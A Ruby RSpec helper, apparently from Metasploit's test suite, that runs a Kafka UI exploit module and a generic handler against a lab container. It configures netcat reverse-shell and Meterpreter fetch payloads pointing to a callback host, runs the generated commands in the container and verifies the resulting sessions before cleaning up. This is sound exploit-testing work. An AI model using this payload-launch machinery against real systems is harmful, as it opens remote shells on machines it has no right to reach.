# frozen_string_literal: true

require_relative '../rsync_creds/native'
require 'English'
require_relative 'observe'

# Use the same proof/closure controls for native handlers and the real owner.
# Read the handler's cached EncodedPayload; generating it again can change its
# fetch resource and would test a different command from the live handler.
module KafkaUiSessionTarget
  include RsyncCredentialTarget

  FAMILIES = {
    'netcat' => ['cmd/unix/reverse_netcat', 'shell', nil],
    'fetch32' => ['cmd/linux/http/x86/meterpreter_reverse_tcp', 'meterpreter', 1],
    'fetch64' => ['cmd/linux/http/x64/meterpreter_reverse_tcp', 'meterpreter', 2],
    'staged64' => ['cmd/linux/http/x64/meterpreter/reverse_tcp', 'meterpreter', 2]
  }.freeze

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'kafka-ui.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def rc_resource_roles
    ENV.fetch('KAFKA_UI_EXPECT_GROOVY') == 'true' ? %w[app broker reporting_db] : %w[app broker]
  end

  def ks_native(script, operation, *arguments)
    argv = ['python3', 'test/module_targets/kafka_ui/' + script, ENV.fetch('MODULE_TARGET_RUNTIME'), ENV.fetch('KAFKA_UI_VERSION'), operation, *arguments]
    output, error, status = Open3.capture3(*argv)
    @rc[:native] << { script: script, operation: operation, argv: argv, exit: status.exitstatus, stdout: output, stderr: error }
    rc_save
    expect(status.exitstatus).to eq(0), output + error
    value = JSON.parse(output)
    expect(value.fetch('passed')).to be(true)
    value.fetch('data')
  end

  def ks_inspect(operation, value)
    ks_native('state_probe.py', operation, value.to_s)
  end

  def ks_port
    server = TCPServer.new('0.0.0.0', 0)
    server.local_address.ip_port
  ensure
    server&.close
  end

  def ks_sessions
    rc_json('framework.sessions.map{|id,session|{id:id,type:session.type,owner:session.via_exploit,payload:session.via_payload,db_id:session.db_record&.id}}')
  end

  def ks_closed_connections(port)
    ks_inspect('connections', port).none? { |row| %w[01 08].include?(row.fetch('state')) }
  end

  def ks_session(family, owner: false, reuse: false, label: family)
    payload, type, elf_class = FAMILIES.fetch(family)
    @workspace = "ks_#{Process.pid}_#{label}"
    expect(@workspace).to match(/\Aks_\d+_[a-z0-9_]+\z/)
    expect(console_command('workspace -a ' + @workspace)).to include(@workspace)
    expect(rc_json('{sessions:framework.sessions.keys,jobs:framework.jobs.keys}')).to eq('sessions' => [], 'jobs' => [])
    port = ks_port
    remote_script = "/tmp/module-target-kafka-sdk-script-#{Process.pid}-#{label}" unless owner
    fetched = "/tmp/module-target-kafka-sdk-fetch-#{Process.pid}-#{label}" if elf_class
    expect(ks_inspect('file', remote_script)).to eq('exists' => false) if remote_script
    expect(ks_inspect('file', fetched)).to eq('exists' => false) if fetched
    expected_owner = owner ? KafkaUiObservation::OWNER : 'exploit/multi/handler'
    attempt = { label: label, owner_path: owner, family: family, payload: payload, workspace: @workspace, status: 'starting', owner_exploit_invoked: false }
    @rc[:sdk] << attempt
    delivery_offset = rc_json('framework.instance_variable_get(:@kafka_payload_deliveries).length')
    independent_owner_offset = rc_json('framework.instance_variable_get(:@kafka_ui_events).length') if !owner && @rc[:owner_observer]
    options = { 'PAYLOAD' => payload, 'LHOST' => @callback.fetch('host'), 'LPORT' => port, 'ReverseListenerBindAddress' => @callback.fetch('bind'), 'ExitOnSession' => false, 'ListenerTimeout' => 60, 'VERBOSE' => true }
    if fetched
      options.merge!('FETCH_COMMAND' => 'WGET', 'FETCH_SRVHOST' => @callback.fetch('host'), 'FETCH_SRVPORT' => ks_port, 'FetchListenerBindAddress' => @callback.fetch('bind'), 'FETCH_WRITABLE_DIR' => '/tmp', 'FETCH_FILENAME' => File.basename(fetched), 'FETCH_URIPATH' => File.basename(fetched), 'FETCH_DELETE' => true)
    end
    if owner
      before_files, = rc_command('owner-tmp-baseline', 'app', 'sh', '-c', 'printf "%s\\n" /tmp/*')
      attempt[:tmp_baseline] = before_files.lines.map(&:strip)
      offset = rc_json('framework.instance_variable_get(:@kafka_ui_events).length')
      attempt[:output_base64] = Base64.strict_encode64(run_target_module(expected_owner, 'app', options.except('ExitOnSession', 'ListenerTimeout').merge('AutoCheck' => true, 'ForceExploit' => false, 'WfsDelay' => 30), action: 'run -z', reuse_module: reuse, command_timeout: 120).b)
      events = rc_json("framework.instance_variable_get(:@kafka_ui_events).drop(#{offset})")
      attempt[:owner_events] = events
      invoked = events.select { |event| event['event'] == 'call' && event['method'] == 'exploit' }
      attempt[:owner_exploit_invoked] = invoked.length == 1
      expect(attempt[:owner_exploit_invoked]).to be(true)
      executions = events.select { |event| event['event'] == 'call' && event['method'] == 'execute_command' }
      expect(executions.length).to eq(1)
      command = Base64.strict_decode64(executions.first.fetch('command_base64'))
      generated = { 'owner' => expected_owner, 'payload' => payload, 'base64' => Base64.strict_encode64(command), 'sha256' => Digest::SHA256.hexdigest(command) }
      attempt[:generated] = generated
      selection = rc_json('active_module.object_id')
      expect(selection).to eq(@rc.fetch(:previous_owner_selection)) if reuse
      @rc[:previous_owner_selection] = selection
      attempt[:selection] = selection
      checks = events.select { |event| event['event'] == 'return' && event['method'] == 'check' }
      expect(checks.map { |event| event.fetch('check').fetch('code') }).to eq([ENV.fetch('KAFKA_UI_VERSION') == '0.7.1' ? 'appears' : 'detected'])
      expect(events).to include(include('event' => 'return', 'method' => 'delete_topic', 'value' => true))
    else
      console_command('back')
      expect(console_command('use exploit/multi/handler')).not_to match(/Failed to load|Unknown command|No results/)
      options.each { |name, value| expect(console_command("set #{name} #{value}")).not_to match(/Unknown datastore option|Invalid option|\[-\]/) }
      expect(console_command('run -j -z')).not_to include('[-]')
      jobs = rc_json('framework.jobs.keys')
      expect(jobs.length).to eq(1)
      generated = rc_json("begin;handler,payload=framework.jobs.fetch(#{jobs.first.inspect}).ctx;command=handler.payload.encoded;{owner:handler.fullname,payload:payload.refname,base64:Base64.strict_encode64(command.b),sha256:Digest::SHA256.hexdigest(command.b)};end")
      expect(generated).to include('owner' => 'exploit/multi/handler', 'payload' => payload)
      command = Base64.strict_decode64(generated.fetch('base64'))
      expect(Digest::SHA256.hexdigest(command)).to eq(generated.fetch('sha256'))
      attempt[:generated] = generated
      fifos = command.scan(%r{\bmkfifo (/tmp/[a-z]{4,7});}).flatten
      expect(fifos.length).to eq(1) if type == 'shell'
      fifos.each { |fifo| rc_command('native-sdk-fifo-absence', 'app', 'sh', '-c', '[ ! -e "$1" ] && [ ! -L "$1" ]', 'native-sdk-fifo', fifo) }
      attempt[:fifos] = fifos
      output, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'exec', '-T', 'app', 'sh', '-c', 'cat > "$1"; chmod 700 "$1"; sha256sum "$1"; stat -c %u "$1"', 'native-sdk', remote_script, stdin_data: command)
      attempt[:install] = { exit: status.exitstatus, stdout: output, stderr: error }
      expect(status.success?).to be(true), error
      expect(ks_inspect('file', remote_script)).to eq('exists' => true, 'uid' => 100, 'base64' => generated.fetch('base64'))
      output, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'exec', '-T', '-d', 'app', '/bin/sh', remote_script)
      attempt[:launch] = { exit: status.exitstatus, stdout: output, stderr: error }
      expect(status.success?).to be(true), error
    end
    metadata = rc_poll(45) do
      ready = File.readlines(@ready.fetch('ready_event_path')).filter_map do |line|
        JSON.parse(line)
      rescue JSON::ParserError
        nil # The asynchronous ready event may still be completing its line.
      end
      ks_sessions.find { |row| row['type'] == type && row['db_id'] && ready.any? { |event| event['id'] == row['id'] } }
    end
    expect(metadata.values_at('type', 'owner', 'payload')).to eq([type, expected_owner, 'payload/' + payload])
    identifier = metadata.fetch('id')
    attempt[:metadata] = metadata
    if owner && type == 'shell'
      raw = rc_json("Base64.strict_encode64(framework.sessions.fetch(#{identifier}).exploit.payload.raw)")
      attempt[:raw_payload_base64] = raw
      fifos = Base64.strict_decode64(raw).scan(%r{\bmkfifo (/tmp/[a-z]{4,7});}).flatten
      expect(fifos.length).to eq(1)
      expect(fifos & attempt.fetch(:tmp_baseline)).to be_empty
      attempt[:fifos] = fifos
    end
    proof = "/tmp/module-target-druid-session-#{Process.pid}_#{identifier}-#{identifier}"
    expect(ks_inspect('file', proof)).to eq('exists' => false)
    result = rc_json("DruidSessionControl.proof(framework,#{identifier},#{proof.inspect})")
    attempt[:session_proof] = result
    expect(result).not_to have_key('error')
    expected = type == 'shell' ? 'druid-session' : ''
    rc_poll { ks_inspect('file', proof).fetch('exists') }
    expect(ks_inspect('file', proof)).to eq('exists' => true, 'uid' => 100, 'base64' => Base64.strict_encode64(expected))
    process = ks_inspect('process', result.fetch('pid'))
    expect(process).to include('exists' => true, 'complete' => true, 'uid' => 100)
    if elf_class
      deliveries = rc_json("framework.instance_variable_get(:@kafka_payload_deliveries).drop(#{delivery_offset})")
      attempt[:deliveries] = deliveries
      expect(deliveries).not_to be_empty
      expect(deliveries).to all(include('elf_class' => elf_class))
      deliveries.each do |delivery|
        expect(Digest::SHA256.file(File.join(target_runtime.fetch('artifacts'), delivery.fetch('file'))).hexdigest).to eq(delivery.fetch('sha256'))
      end
      expect(deliveries).to include(include('sha256' => process.fetch('exe_sha256'))) unless family == 'staged64'
    end
    expect(ks_inspect('connections', port)).to include(include('state' => '01', 'uid' => 100))
    reports = JSON.parse(rc_sql("SELECT coalesce(json_agg(row),'[]'::json) FROM (SELECT s.id,s.stype,s.via_exploit,s.via_payload,w.name AS workspace FROM sessions s JOIN hosts h ON h.id=s.host_id JOIN workspaces w ON w.id=h.workspace_id WHERE s.id=#{metadata.fetch('db_id')}) row"))
    expect(reports).to include(include('id' => metadata.fetch('db_id'), 'stype' => type, 'via_exploit' => expected_owner, 'via_payload' => 'payload/' + payload, 'workspace' => @workspace))
    if independent_owner_offset
      native_events = rc_json("framework.instance_variable_get(:@kafka_ui_events).drop(#{independent_owner_offset})")
      expect(native_events.none? { |event| event['event'] == 'call' && event['method'] == 'exploit' }).to be(true)
      attempt[:native_owner_absence_verified] = true
    end
    attempt.merge!(native_process: process, reports: reports, status: 'used')
  ensure
    primary_error = $ERROR_INFO
    begin
      if attempt
        attempt[:failure] = { type: primary_error.class.name, message: primary_error.message } if primary_error
        attempt[:owner_events] ||= rc_json("framework.instance_variable_get(:@kafka_ui_events).drop(#{offset})") if owner && offset
        rc_command('remove-sdk-proof', 'app', 'rm', '-f', proof) if proof
        ks_sessions.each do |session|
          rc_json("DruidSessionControl.dispatch(framework,'exit',#{session.fetch('id')})")
          rc_json("begin;session=framework.sessions[#{session.fetch('id')}];session.kill if session;true;end")
        end
        if result && result['pid']
          rc_poll(20) { !ks_inspect('process', result.fetch('pid')).fetch('exists') }
        end
        rc_poll(20) { ks_closed_connections(port) }
        rc_poll(20) { !ks_inspect('file', fetched).fetch('exists') } if fetched
        Array(fifos).each do |fifo|
          rc_poll(20) do
            output, = rc_command('native-sdk-fifo-cleanup', 'app', 'sh', '-c', 'if [ -e "$1" ] || [ -L "$1" ]; then printf PRESENT; else printf ABSENT; fi', 'native-sdk-fifo', fifo)
            output == 'ABSENT'
          end
        end
        console_command('jobs -K')
        expect(rc_json('{sessions:framework.sessions.keys,jobs:framework.jobs.keys}')).to eq('sessions' => [], 'jobs' => [])
        if metadata
          closed = rc_poll { JSON.parse(rc_sql("SELECT coalesce(json_agg(row),'[]'::json) FROM (SELECT id,closed_at FROM sessions WHERE id=#{metadata.fetch('db_id')}) row")).find { |row| row['closed_at'] } }
          attempt[:closed_report] = closed
        end
        if remote_script
          rc_command('remove-native-sdk-script', 'app', 'rm', '-f', remote_script)
          expect(ks_inspect('file', remote_script)).to eq('exists' => false)
        end
        expect(ks_inspect('file', proof)).to eq('exists' => false) if proof
        rc_resources('after-native-sdk')
        ks_native('native.py', 'audit') if owner
        if primary_error
          attempt[:status] = owner ? 'owner_path_failed_unclassified' : 'native_prerequisite_failed'
        else
          attempt[:status] = 'passed'
        end
      end
    rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
      @rc[:cleanup_errors] << { family: family, type: e.class.name, message: e.message, primary_error: primary_error&.message }
      attempt[:status] = owner ? 'owner_cleanup_failed_unclassified' : 'native_cleanup_failed' if attempt
      raise unless primary_error
    ensure
      rc_save
    end
  end
end
